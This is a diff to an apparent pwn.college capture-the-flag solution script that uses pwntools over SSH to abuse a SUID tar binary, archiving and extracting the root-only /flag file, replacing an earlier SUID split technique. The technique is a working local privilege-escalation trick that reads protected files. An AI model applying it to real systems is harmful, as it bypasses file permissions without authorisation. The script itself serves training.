@@ -6,17 +6,16 @@ context.log_level = "info"
 # Connect to pwn.college SSH
 s = ssh(host="dojo.pwn.college", user="hacker", raw=True)
 
-# First run /challenge/babysuid_level16 to make /usr/bin/split SUID
-s.process("/challenge/babysuid_level16")
+# First run /challenge/babysuid_level20 to make /usr/bin/tar SUID
+s.process("/challenge/babysuid_level20")
 
 # Start a bash shell
 sh = s.shell()
 
-# Send the command to run /usr/bin/split /flag
-# ? The split command splits a file into pieces,
-# ? so we split the file into a temporary file
-# ? and cat all the pieces together to get the flag
-sh.sendline(b"split /flag /tmp/level16; cat /tmp/level16*")
+# Send the command to run /usr/bin/tar /flag
+# ? tar -cf /tmp/level20 /flag to create a tar archive of /flag
+# ? tar -Oxf /tmp/level20 to extract the tar archive to stdout
+sh.sendline(b"tar -cf /tmp/level20 /flag 2>/dev/null; tar -Oxf /tmp/level20")
 sh.recvuntil(b"pwn.college")
 
 # Receive the output
